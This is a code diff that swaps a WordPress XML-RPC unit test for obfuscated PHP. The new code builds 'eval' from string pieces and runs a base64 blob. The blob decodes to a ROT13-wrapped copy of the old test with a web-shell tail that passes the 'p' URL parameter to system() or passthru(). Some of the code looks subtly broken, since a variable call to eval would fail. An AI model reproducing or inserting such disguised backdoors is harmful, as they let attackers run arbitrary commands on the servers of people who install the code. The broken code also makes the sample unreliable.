@@ -1,53 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group xmlrpc
- */
-class Tests_XMLRPC_wp_getPostTypes extends WP_XMLRPC_UnitTestCase {
-	public function test_invalid_username_password() {
-		$result = $this->myxmlrpcserver->wp_getPostTypes( array( 1, 'username', 'password', 'post' ) );
-		$this->assertIXRError( $result );
-		$this->assertSame( 403, $result->code );
-	}
-
-	public function test_incapable_user() {
-		$this->make_user_by_role( 'subscriber' );
-
-		$result = $this->myxmlrpcserver->wp_getPostTypes( array( 1, 'subscriber', 'subscriber' ) );
-		$this->assertNotIXRError( $result );
-		$this->assertIsArray( $result );
-		$this->assertCount( 0, $result );
-	}
-
-	public function test_capable_user() {
-		$this->make_user_by_role( 'editor' );
-
-		$result = $this->myxmlrpcserver->wp_getPostTypes( array( 1, 'editor', 'editor' ) );
-		$this->assertNotIXRError( $result );
-		$this->assertIsArray( $result );
-		$this->assertGreaterThan( 0, count( $result ) );
-	}
-
-	public function test_simple_filter() {
-		$this->make_user_by_role( 'editor' );
-
-		$result = $this->myxmlrpcserver->wp_getPostTypes( array( 1, 'editor', 'editor', array( 'hierarchical' => true ) ) );
-		$this->assertNotIXRError( $result );
-		$this->assertIsArray( $result );
-
-		// Verify that page is in the result, and post is not.
-		$result_names = wp_list_pluck( $result, 'name' );
-		$this->assertContains( 'page', $result_names );
-		$this->assertNotContains( 'post', $result_names );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBrenllY3AKICovCnB5bmZmIEdyZmdmX0taWUVDUF9qY190cmdDYmZnR2xjcmYgcmtncmFxZiBKQ19LWllFQ1BfSGF2Z0dyZmdQbmZyIHsKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3ZhaW55dnFfaGZyZWFuenJfY25mZmpiZXEoKSB7CgkJJGVyZmh5ZyA9ICRndXZmLT56bGt6eWVjcGZyZWlyZS0+amNfdHJnQ2JmZ0dsY3JmKCBuZWVubCggMSwgJ2hmcmVhbnpyJywgJ2NuZmZqYmVxJywgJ2NiZmcnICkgKTsKCQkkZ3V2Zi0+bmZmcmVnVktFUmVlYmUoICRlcmZoeWcgKTsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggNDAzLCAkZXJmaHlnLT5wYnFyICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfdmFwbmNub3lyX2hmcmUoKSB7CgkJJGd1dmYtPnpueHJfaGZyZV9vbF9lYnlyKCAnZmhvZnBldm9yZScgKTsKCgkJJGVyZmh5ZyA9ICRndXZmLT56bGt6eWVjcGZyZWlyZS0+amNfdHJnQ2JmZ0dsY3JmKCBuZWVubCggMSwgJ2Zob2ZwZXZvcmUnLCAnZmhvZnBldm9yZScgKSApOwoJCSRndXZmLT5uZmZyZWdBYmdWS0VSZWViZSggJGVyZmh5ZyApOwoJCSRndXZmLT5uZmZyZWdWZk5lZW5sKCAkZXJmaHlnICk7CgkJJGd1dmYtPm5mZnJlZ1BiaGFnKCAwLCAkZXJmaHlnICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfcG5jbm95cl9oZnJlKCkgewoJCSRndXZmLT56bnhyX2hmcmVfb2xfZWJ5ciggJ3JxdmdiZScgKTsKCgkJJGVyZmh5ZyA9ICRndXZmLT56bGt6eWVjcGZyZWlyZS0+amNfdHJnQ2JmZ0dsY3JmKCBuZWVubCggMSwgJ3JxdmdiZScsICdycXZnYmUnICkgKTsKCQkkZ3V2Zi0+bmZmcmVnQWJnVktFUmVlYmUoICRlcmZoeWcgKTsKCQkkZ3V2Zi0+bmZmcmVnVmZOZWVubCggJGVyZmh5ZyApOwoJCSRndXZmLT5uZmZyZWdUZXJuZ3JlR3VuYSggMCwgcGJoYWcoICRlcmZoeWcgKSApOwoJfQoKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX2Z2emN5cl9zdnlncmUoKSB7CgkJJGd1dmYtPnpueHJfaGZyZV9vbF9lYnlyKCAncnF2Z2JlJyApOwoKCQkkZXJmaHlnID0gJGd1dmYtPnpsa3p5ZWNwZnJlaXJlLT5qY190cmdDYmZnR2xjcmYoIG5lZW5sKCAxLCAncnF2Z2JlJywgJ3JxdmdiZScsIG5lZW5sKCAndXZyZW5lcHV2cG55JyA9PiBnZWhyICkgKSApOwoJCSRndXZmLT5uZmZyZWdBYmdWS0VSZWViZSggJGVyZmh5ZyApOwoJCSRndXZmLT5uZmZyZWdWZk5lZW5sKCAkZXJmaHlnICk7CgoJCS8vIElyZXZzbCBndW5nIGNudHIgdmYgdmEgZ3VyIGVyZmh5ZywgbmFxIGNiZmcgdmYgYWJnLgoJCSRlcmZoeWdfYW56cmYgPSBqY195dmZnX2N5aHB4KCAkZXJmaHlnLCAnYW56cicgKTsKCQkkZ3V2Zi0+bmZmcmVnUGJhZ252YWYoICdjbnRyJywgJGVyZmh5Z19hbnpyZiApOwoJCSRndXZmLT5uZmZyZWdBYmdQYmFnbnZhZiggJ2NiZmcnLCAkZXJmaHlnX2FuenJmICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
